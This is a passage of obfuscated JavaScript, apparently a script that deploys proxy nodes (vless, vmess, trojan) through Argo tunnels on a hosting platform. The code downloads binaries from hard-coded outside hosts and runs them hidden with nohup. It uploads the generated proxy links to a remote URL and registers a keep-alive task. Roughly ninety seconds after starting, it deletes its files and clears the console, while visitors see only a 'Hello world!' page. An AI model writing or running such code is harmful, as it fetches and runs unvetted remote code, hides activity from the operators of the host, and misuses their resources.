_0x187ee2=fs['readFileSync'](listPath,'utf-8'),_0x5982a6=_0x187ee2[_0x33046f(0x180)]('\x0a')[_0x33046f(_0x9841d8._0x51bcd6)](_0x47f23d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x33046f(0x19f)](_0x47f23d));if(_0x5982a6[_0x33046f(_0x9841d8._0xe5b91c)]===0x0)return;const _0x2d47d7=JSON[_0x33046f(_0x9841d8._0x244d9a)]({'nodes':_0x5982a6});try{const _0x26be5d=await axios[_0x33046f(_0x9841d8._0x4ad48a)](UPLOAD_URL+'/api/add-nodes',_0x2d47d7,{'headers':{'Content-Type':_0x33046f(0x169)}});return _0x26be5d&&_0x26be5d[_0x33046f(0x1fe)]===0xc8?(console[_0x33046f(0x1a5)](_0x33046f(_0x9841d8._0x2c1019)),_0x26be5d):null;}catch(_0x32929f){return null;}}else return;}}function cleanFiles(){const _0x538a90={_0x5298ad:0x1b0,_0x4951c1:0x1b0,_0x79a1f:0x1b9},_0x5edaf3={_0x44aef4:0x18c};setTimeout(()=>{const _0x463b85={_0x289fc2:0x18c,_0x5edeae:0x1a5,_0x5cb987:0x14c},_0x42c198=_0x39fd,_0x8e3923=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x8e3923[_0x42c198(_0x538a90._0x5298ad)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x8e3923[_0x42c198(_0x538a90._0x4951c1)](phpPath);process['platform']==='win32'?exec(_0x42c198(0x1af)+_0x8e3923[_0x42c198(_0x538a90._0x79a1f)]('\x20')+_0x42c198(0x201),_0x21d73c=>{const _0x30f57f=_0x42c198;console[_0x30f57f(0x146)](),console[_0x30f57f(0x1a5)](_0x30f57f(_0x5edaf3._0x44aef4)),console[_0x30f57f(0x1a5)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x42c198(0x15c)+_0x8e3923[_0x42c198(0x1b9)]('\x20')+'\x20>/dev/null\x202>&1',_0x164f71=>{const _0x1bbf77=_0x42c198;console['clear'](),console['log'](_0x1bbf77(_0x463b85._0x289fc2)),console[_0x1bbf77(_0x463b85._0x5edeae)](_0x1bbf77(_0x463b85._0x5cb987));});},0x15f90);}function _0x4382(){const _0x492ccc=['/vmess-argo','readdirSync','fileUrl','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1221857LnyDmF','substring','NEZHA_SERVER','\x20failed:\x20','\x20already\x20exists','del\x20/f\x20/q\x20','push','pipe','then','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http\x20server\x20is\x20running\x20on\x20port:','http','vless','get','quic','join','stream','54750COlshq','SERVER_PORT','base64','direct','config.json','createWriteStream','unshift','web\x20running\x20error:\x20','\x20successfully','2053','existsSync','?security=tls&sni=','tunnel.yml','env','false','countryCode','127.0.0.1','none','?encryption=none&security=tls&sni=','Nodes\x20uploaded\x20successfully','8443','Empowerment\x20success\x20for\x20','Error\x20executing\x20command:\x20','Skipping\x20adding\x20automatic\x20access\x20task','\x20is\x20running','UUID','fileName','text/plain;\x20charset=utf-8','NEZHA_KEY','2087','Subscription\x20uploaded\x20successfully','Hello\x20world!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','712VobeRt','statSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','aarch64','https://amd64.ssss.nyc.mn/agent','cdns.doon.eu.org','chmod','http://ip-api.com/json/','automatic\x20access\x20task\x20added\x20successfully','/trojan-argo','has','10MZoEGw','match','forEach','https://arm64.ssss.nyc.mn/v1','child_process','\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','abc2026','toString','Download\x20','https://arm64.ssss.nyc.mn/bot','block','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20credentials-file:\x20','error','35487BgDLvN','arm','random','post','ARGO_AUTH','ArgoDomain:','\x0a\x0atrojan://','status','set','php\x20running\x20error:\x20','\x20>\x20nul\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','floor','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','country_code','pop','tls','unlink','clear','260115XEXJUi','443','75WbNVwF','&path=%2Ftrojan-argo%3Fed%3D2560#','writeFileSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://oooo.serv00.net/add-url','freedom','tcp','&fp=firefox&type=ws&host=','message','true','data','\x0aclient_secret:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20-s\x20','TunnelSecret','/vless-argo','from','2096','Empowerment\x20failed\x20for\x20','rm\x20-rf\x20','exec','listen','1613491qJeTQu','nohup\x20','/vmess-argo?ed=2560','UPLOAD_URL','Error\x20reading\x20boot.log:','/tunnel.yml\x20run','includes','filter','all','platform','application/json','abcdefghijklmnopqrstuvwxyz','arch','CFIP','SUB_PATH','axios','Error\x20in\x20startserver:','tunnel.json','Error\x20downloading\x20files:','/dev/null','finish','111f447f-2276-4d15-baea-e5f9e6e8d7dd','unlinkSync','utf-8','stringify','https://ipapi.co/json/','14328bedygf','amd','catch','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','org','\x0a\x0avmess://','\x0a\x20\x20\x20\x20','split','length','win32','mkdirSync','xtls-rprx-vision','isFile','taskkill\x20/f\x20/im\x20','AUTO_ACCESS','ARGO_DOMAIN','FILE_PATH','./tmp','\x20-p\x20','App\x20is\x20running','Content-Type','response','sub.txt','map','/api/add-subscriptions','40gbzSvy','boot.log','https://arm64.ssss.nyc.mn/web','.exe\x20>\x20nul\x202>&1','send','npm\x20running\x20error:\x20','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','590220izJQTk','pkill\x20-f\x20\x22[','success','https+local://8.8.8.8/dns-query','readFileSync','test','util','basename','NEZHA_PORT','https://arm64.ssss.nyc.mn/agent','charAt','log'];_0x4382=function(){return _0x492ccc;};return _0x4382();}cleanFiles();async function AddVisitTask(){const _0x314640={_0x23f3c5:0x1fa,_0x1b3684:0x14d,_0x49dd1e:0x169,_0x475be2:0x1a5,_0x4c089e:0x1e5,_0x4eacab:0x151},_0x2f0ceb=_0x9d43b2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f0ceb(0x1a5)](_0x2f0ceb(0x1d2));return;}try{const _0x16ba9c=await axios[_0x2f0ceb(_0x314640._0x23f3c5)](_0x2f0ceb(_0x314640._0x1b3684),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f0ceb(_0x314640._0x49dd1e)}});return console[_0x2f0ceb(_0x314640._0x475be2)](_0x2f0ceb(_0x314640._0x4c089e)),_0x16ba9c;}catch(_0x4f2037){return console[_0x2f0ceb(0x1f6)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4f2037[_0x2f0ceb(_0x314640._0x4eacab)]),null;}}async function startserver(){const _0x445875={_0x506aa0:0x16f},_0x2531ee=_0x9d43b2;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4c37c9){console['error'](_0x2531ee(_0x445875._0x506aa0),_0x4c37c9);}}startserver()[_0x9d43b2(0x17b)](_0x5ec17e=>{const _0x4211a0=_0x9d43b2;console[_0x4211a0(0x1f6)]('Unhandled\x20error\x20in\x20startserver:',_0x5ec17e);}),app[_0x9d43b2(0x15e)](PORT,()=>console[_0x9d43b2(0x1a5)](_0x9d43b2(0x1b4)+PORT+'!'));
